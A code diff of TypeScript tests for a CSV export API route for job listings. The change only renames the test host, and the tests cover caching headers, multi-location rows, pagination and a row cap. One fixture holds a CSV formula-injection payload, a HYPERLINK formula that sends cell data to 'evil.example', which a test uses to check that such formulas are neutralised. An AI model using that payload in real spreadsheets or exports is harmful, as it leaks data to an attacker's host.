@@ -28,7 +28,7 @@ const row = (title: string, location: string) => ({
 
 it("is private and never cached, and writes scraped formulas as text", async () => {
   fetchRoleRows.mockResolvedValueOnce([row('=HYPERLINK("https://evil.example/?"&A2,"Apply")', "@London")]).mockResolvedValue([]);
-  const response = await GET(new NextRequest("https://ava.test/api/export.csv"));
+  const response = await GET(new NextRequest("https://col.test/api/export.csv"));
   expect(response.status).toBe(200);
   expect(response.headers.get("cache-control")).toBe("private, no-store");
   expect(response.headers.get("x-content-type-options")).toBe("nosniff");
@@ -43,7 +43,7 @@ it("exports every resolved location, including a city beyond the primary one", a
   const multiLocation = row("Workday consultant", "USA, GA, Atlanta");
   multiLocation.job.locations = ["USA, GA, Atlanta", "USA, VA, Reston", "USA, MA, Boston"];
   fetchRoleRows.mockResolvedValueOnce([multiLocation]).mockResolvedValue([]);
-  const text = await (await GET(new NextRequest("https://ava.test/api/export.csv?location=Boston"))).text();
+  const text = await (await GET(new NextRequest("https://col.test/api/export.csv?location=Boston"))).text();
   expect(text).toContain('"USA, GA, Atlanta; USA, VA, Reston; USA, MA, Boston"');
 });
 
@@ -51,7 +51,7 @@ it("keeps the primary location when no resolved list is available", async () => 
   const primaryOnly = row("Operations manager", "London");
   primaryOnly.job.locations = [];
   fetchRoleRows.mockResolvedValueOnce([primaryOnly]).mockResolvedValue([]);
-  const text = await (await GET(new NextRequest("https://ava.test/api/export.csv"))).text();
+  const text = await (await GET(new NextRequest("https://col.test/api/export.csv"))).text();
   expect(text).toContain("Operations manager,London,");
 });
 
@@ -60,7 +60,7 @@ const block = (from: number, n: number) => Array.from({ length: n }, (_, i) => (
 
 it("reads each block after the last row it wrote, never at an offset", async () => {
   fetchRoleRows.mockResolvedValueOnce(block(0, 500)).mockResolvedValueOnce(block(500, 3)).mockResolvedValue([]);
-  const text = await (await GET(new NextRequest("https://ava.test/api/export.csv"))).text();
+  const text = await (await GET(new NextRequest("https://col.test/api/export.csv"))).text();
   expect(text.split("\r\n").filter(Boolean)).toHaveLength(1 + 503);
   const options = fetchRoleRows.mock.calls.map((call) => call[3] as { after: unknown; limit: number; offset?: number });
   expect(options.map((o) => o.after)).toEqual([null, [499, "id-499"]]);
@@ -74,7 +74,7 @@ it("asks for one row after the last one written before saying a capped file was 
     next += options.limit;
     return rows;
   });
-  const text = await (await GET(new NextRequest("https://ava.test/api/export.csv"))).text();
+  const text = await (await GET(new NextRequest("https://col.test/api/export.csv"))).text();
   const lines = text.split("\r\n").filter(Boolean);
   expect(lines).toHaveLength(1 + 20_000 + 1);
   expect(lines.at(-1)).toContain("Truncated at 20,000 rows");
